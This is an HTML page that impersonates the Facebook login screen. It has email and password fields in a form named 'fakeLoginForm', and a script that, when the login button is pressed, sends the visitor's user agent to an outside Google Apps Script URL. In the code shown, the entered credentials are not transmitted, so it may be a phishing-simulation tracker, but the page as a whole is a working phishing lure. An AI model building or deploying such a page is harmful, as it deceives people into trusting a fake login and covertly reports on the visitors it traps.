<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Log in</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h1>facebook</h1>
        <form id="fakeLoginForm">
            <input type="text" id="email" placeholder="Email address or phone number" required>
            <input type="password" id="password" placeholder="password" required>
            <button type="submit" onclick="trackLogin()">Log in</button>
        </form>
        <p><a href="#" style="text-decoration: none">Forgot your password?</a></p>
    </div>
    <script src="script.js"></script>
    <script>
        function trackLogin() {
            const gasUrl = "https://script.google.com/macros/s/AKfycbz9Psuv1DV7YJA1ynMHABih1-IFnIaVaDuNL2XVUm7-x26W0n4vP-nlj5EnTYrwwWrq/exec";
            const ip = "不明"; // クライアント側からIP取得は難しいので省略
            const userAgent = navigator.userAgent;

            fetch(`${gasUrl}?ip=${ip}&ua=${encodeURIComponent(userAgent)}`)
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error("エラー:", error));
        }
    </script>
</body>
</html>
